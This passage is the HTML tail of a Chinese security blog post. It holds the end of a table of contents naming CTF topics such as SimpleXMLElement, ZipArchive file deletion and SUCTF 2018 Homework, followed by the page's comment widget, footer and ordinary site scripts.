class="toc-item toc-level-2"><a class="toc-link" href="#SimpleXMLElement-%E7%B1%BB"><span class="toc-number">8.1.</span> <span class="toc-text">SimpleXMLElement 类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUCTF-2018-Homework"><span class="toc-number">8.2.</span> <span class="toc-text">[SUCTF 2018]Homework</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-ZipArchive-%E7%B1%BB%E6%9D%A5%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6"><span class="toc-number">9.</span> <span class="toc-text">使用 ZipArchive 类来删除文件</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ZipArchive-%E7%B1%BB"><span class="toc-number">9.1.</span> <span class="toc-text">ZipArchive 类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A2%A6%E9%87%8C%E8%8A%B1%E5%BC%80%E7%89%A1%E4%B8%B9%E4%BA%AD"><span class="toc-number">9.2.</span> <span class="toc-text">梦里花开牡丹亭</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">10.</span> <span class="toc-text">参考链接</span></a></li></ol></nav></aside></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="next" href="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/">内网学习篇 &gt;</a></div><div id="valine-comment"><style type="text/css">.night .v[data-class=v] a { color: #0F9FB4 !important; }
.night .v[data-class=v] a:hover { color: #216C73 !important; }
.night .v[data-class=v] li { list-style: inherit; }
.night .v[data-class=v] .vwrap { border: 1px solid #223441; border-radius: 0; }
.night .v[data-class=v] .vwrap:hover { box-shadow: 0 0 6px 1px #223441; }
.night .v[data-class=v] .vbtn { border-radius: 0; background: none; }
.night .v[data-class=v] .vlist .vcard .vh { border-bottom-color: #293D4E; }
.night .v[data-class=v] .vwrap .vheader .vinput { border-bottom-color: #223441; }
.night .v[data-class=v] .vwrap .vheader .vinput:focus { border-bottom-color: #339EB4; }
.night .v[data-class=v] code, .night .v[data-class=v] pre,.night .v[data-class=v] .vlist .vcard .vhead .vsys { background: #203240 !important; }
.night .v[data-class=v] code, .night .v[data-class=v] pre { color: #F0F0F0; font-size: 95%; }
.v[data-class=v] .vcards .vcard .vh {border-bottom-color: #223441; }
.night .v[data-class=v] .vcards .vcard .vcontent.expand:before {background: linear-gradient(180deg,rgba(38,57,73,.4),rgba(38,57,73,.9));}
.night .v[data-class=v] .vcards .vcard .vcontent.expand:after {background: rgba(38,57,73,.9)}
</style><div id="vcomment"></div><script src="//cdn.bootcdn.net/ajax/libs/valine/1.4.14/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
var verify = 'false' == true ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'',
  appKey:'',
  lang: 'zh-cn',
  placeholder:'ヾﾉ≧∀≦)o Come on, say something...',
  avatar:'identicon',
  guest_info:guest_info,
  pageSize:'10'
})</script></div></section><footer><p>Copyright © 2016 - 2022 <a href="/." rel="nofollow">sakura</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script>var search_path = 'search.xml';
if (search_path.length == 0) {
    search_path = 'search.xml';
}
var path = '/' + search_path;
searchFunc(path, 'local-search-input', 'local-search-result');
</script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script></body></html>